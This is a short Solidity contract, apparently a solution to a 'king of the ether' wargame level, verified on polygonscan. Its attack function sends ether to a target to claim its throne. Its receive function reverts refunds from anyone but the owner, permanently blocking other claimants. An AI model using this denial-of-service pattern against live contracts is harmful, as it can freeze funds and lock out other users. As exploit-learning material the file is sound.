/**
 *Submitted for verification at polygonscan.com on 2023-03-09
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract bad {
    address public owner;

    constructor() payable{
        owner=msg.sender;
    }

    function attack(address _king) public payable{
        (bool s,)=payable(_king).call{value:msg.value}("");
        require(s);
    }

    receive() external payable {
    if(msg.sender!=owner){
        revert();
    }
    
  }
}